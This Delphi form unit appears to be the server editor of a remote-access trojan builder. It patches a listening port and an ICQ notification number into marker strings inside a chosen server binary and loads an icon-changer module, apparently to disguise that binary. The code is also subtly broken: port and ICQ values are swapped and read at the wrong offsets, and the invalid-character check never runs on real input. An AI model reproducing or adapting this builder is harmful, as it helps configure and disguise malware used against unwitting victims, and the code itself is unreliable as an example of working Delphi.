   unit Unit2;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, TFlatTitlebarUnit, ExtCtrls,y3kiconchanger,IconExtractor;

   type
     TForm2 = class(TForm)
       Shape1: TShape;
       FlatTitlebar1: TFlatTitlebar;
       Label1: TLabel;
       Label2: TLabel;
       Edit1: TEdit;
       Button1: TButton;
       Button2: TButton;
       Button3: TButton;
       Label3: TLabel;
       Label4: TLabel;
       Openserver: TOpenDialog;
             function CanEdit:Boolean;
       procedure ReadFile(lpFileName:string;var lpFileBuffer:string);
       procedure ShowSettings(lpFileName:string);
       procedure SaveSettings(lpFileName:string;NewFile:string);
       function AdjustString(lpString:string; lpSize:integer):string;
       function ValidFile(cPos:longint):Boolean;
       procedure FormCreate(Sender: TObject);
       procedure Button1Click(Sender: TObject);
       procedure Button2Click(Sender: TObject);
       procedure Button3Click(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
       Streamsize: TFileStream;
       ServName:string;
     end;

   var
     Form2: TForm2;
     ieIconExtractor:TIconExtractor;
     startup:string='Startup';
     finternet:string='On found internet';
     never:string='Never';
   const
     port           :string='poooort=';
     ICQ_NUMBER     :string='icQpage=';

   //invalid chars?
     InvalidChars:array [0..8] of shortstring = ('\','/',':','*','?','"','<','>','|'); // this part i dont knoe if its needed or not hmmm
   implementation

   uses Unit1, Unit5;

   {$R *.dfm}


   procedure TForm2.ShowSettings(lpFileName:string);
   var
      fContent:string;
      a,
      b:longint;
      cICQ,
      cport:string;
   begin
      ReadFile(lpFileName,fContent);

      a:=pos(port,fcontent);
      b:=Pos(ICQ_NUMBER,fContent);
      if not ValidFile(b) then Exit;
      cICQ:=Trim(Copy(fContent,a + Length(ICQ_NUMBER),10));
      cport:=trim(copy(fcontent,b+ length(port),10));


       form1.edit1.text:=cICQ;
       form1.Edit2.Text:=cPort;
      fContent:=EmptyStr;
   end;
   function TForm2.ValidFile(cPos:longint):Boolean;
   var
      r:Boolean;
   begin
      r:=cPos > 0;
      if not r then
         MessageBox(handle,'Please, select an valid file.',PChar(Caption),MB_ICONERROR);
      ValidFile:=r;
   end;
   procedure TFORM2.ReadFile(lpFileName:string;var lpFileBuffer:string);
   var
      lpFile:File of Char;
      cBuffer:array [1..1024] of Char;
      r,Len:LongInt;
   begin
      lpFileBuffer:='';
      AssignFile(lpFile,lpFileName);
      Reset(lpFile);
      Len:=FileSize(lpFile);
      while not Eof(lpFile) do
      begin
         BlockRead(lpFile,cBuffer,1024,r);
         lpFileBuffer:=lpFileBuffer + string(cBuffer)
      end;
      CloseFile(lpFile);
      if Length(lpFileBuffer) > Len then
         lpFileBuffer:=Copy(lpFileBuffer,1,Len);
   end;
   function TForm2.CanEdit:Boolean;
   var
      LongSrv,LongUP:Longint;
      i:Integer;
      f:string;
      bFile:Boolean;
   begin
      CanEdit:=False;
      if StrToInt(form1.Edit1.text) < 0 then
      begin
         MessageBox(handle,'Please, enter an valid ICQ UIN.',PChar(Caption),MB_ICONERROR);
         Edit1.SetFocus;
         Exit;
      end;


      bFile:=False;
      for i:=0 to 8 do
         if Pos(InvalidChars[i],f) > 0 then
         begin
            bFile:=True;
            Break;
         end;

      CanEdit:=True;
   end;




















   function Tform2.AdjustString(lpString:string; lpSize:integer):string;
   var
      l:integer;
   begin
      l:=Length(lpString);
      if l = lpSize then
      begin
         AdjustString:=lpString;
         Exit;
      end;
      if l < lpSize then
      begin
         AdjustString:=lpString + StringOfChar(' ',lpSize - l);
         Exit;
      end;
      if l > lpSize then
      begin
         AdjustString:=Copy(lpString,1,lpSize);
         Exit;
      end;
   end;

   procedure Tform2.SaveSettings(lpFileName:string;NewFile:string);
   var
      fContent:string;
      a,
      b,
      l:longint;
      cICQ,
      cport
      :string;
      lpFile:TextFile;
   begin
      ReadFile(lpFileName,fContent);
      l:=Length(fContent);

      //Port to listen :
    cicq := trim(form1.edit2.text);
    cport :=  trim(form1.edit1.text);

    cport := adjuststring(cport,10);
    cicq := adjuststring(cicq,10);

      a:=Pos(ICQ_Number,fContent);
      b:=Pos(PORT,fContent);
      if not ValidFile(b) then Exit;
   fContent:=Copy(fContent,1,a + Length(ICQ_NUMBER) - 1) + cICQ + Copy(fContent,a + Length(ICQ_NUMBER) + 10,l);

      AssignFile(lpFile,NewFile);
      ReWrite(lpFile);
      Writeln(lpFile,fContent);
      CloseFile(lpFile);

   fContent:=Copy(fContent,1,b + Length(port) - 1) + cport + Copy(fContent,b + Length(port) + 10,l);

      AssignFile(lpFile,NewFile);
      ReWrite(lpFile);
      Writeln(lpFile,fContent);
      CloseFile(lpFile);

      fContent:=EmptyStr;
   end;







   procedure TForm2.FormCreate(Sender: TObject);
   begin
   ieIconExtractor:=TIconExtractor.Create(ieIconExtractor);
   end;

   procedure TForm2.Button1Click(Sender: TObject);
   begin
   if openserver.Execute then
   begin
   edit1.text := openserver.FileName;
   Streamsize := TFileStream.Create(ExtractFileName(openserver.filename), fmopenread); // Stream created just to Calculate size
         label4.caption := inttostr(Streamsize.Size)+' Bytes';
         Streamsize.Position := 0;
         Streamsize.Free;
   servname := edit1.text;
   end;
   end;

   procedure TForm2.Button2Click(Sender: TObject);
   begin
       ShowSettings(edit1.Text);
   // check password
   if form1.pwd.text = '1' then begin
    form5.Edit2.text := form1.pwd.text;
    form5.show;
   end
   else
   begin
   form1.Enabled := true;
   form2.Hide;
   end;
   end;

   procedure TForm2.Button3Click(Sender: TObject);
   begin
   application.Terminate;
   end;

   end.
